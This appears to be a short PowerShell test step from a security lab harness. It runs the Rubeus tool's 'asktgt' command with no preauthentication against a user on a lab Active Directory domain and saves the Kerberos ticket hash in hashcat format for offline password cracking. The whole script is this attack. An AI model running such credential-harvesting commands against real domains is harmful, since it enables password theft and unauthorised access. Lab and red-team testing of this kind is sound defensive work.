[CmdletBinding()]
param()
$ErrorActionPreference = "Continue"
$exe = "C:\Tools\cadre-attack\Rubeus.exe"
if (-not (Test-Path -LiteralPath $exe)) {
    Write-Output "T003_FAIL: Rubeus.exe missing"
    exit 1
}
& $exe asktgt /user:intern_blue /domain:child.cadre.local /dc:dc02.child.cadre.local /nopreauth /nowrap /format:hashcat
